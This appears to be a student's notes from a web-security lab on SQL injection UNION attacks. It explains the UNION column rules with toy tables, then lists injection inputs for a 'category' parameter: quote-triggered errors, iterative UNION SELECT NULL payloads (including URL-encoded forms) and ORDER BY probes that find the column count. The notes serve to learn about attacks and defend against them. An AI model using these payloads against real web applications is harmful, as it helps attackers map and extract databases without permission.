Goal: Determine the number of columns returned by the query

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

Analysis:
category=' gives us an internal error
Probably vulnerable to SQLi

category='-- doesn't give us back anything as it just commented out everything

SQLi attack (way #1):

category=Gifts'UNION select NULL-- gives us an internal server error because there's
probably more than one column in the query.
Keep going interatively

category=Gifts'UNION select NULL, NULL--
category=Gifts'UNION select NULL, NULL, NULL--
Gifts'UNION%20select%20NULL%2c%20NULL%2c%20NULL--
Behind: category='Gifts' UNION select NULL,NULL,NULL--'

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

Corporate gifts' ORDER BY 1--
Corporate gifts' ORDER BY 2--
Corporate gifts' ORDER BY 3--
Corporate gifts' ORDER BY 4-- Server error so we know there are only 3 columns

select a, b from table1 order by 3
If it doesn't have 3, it will error so you know how many columns are being used.
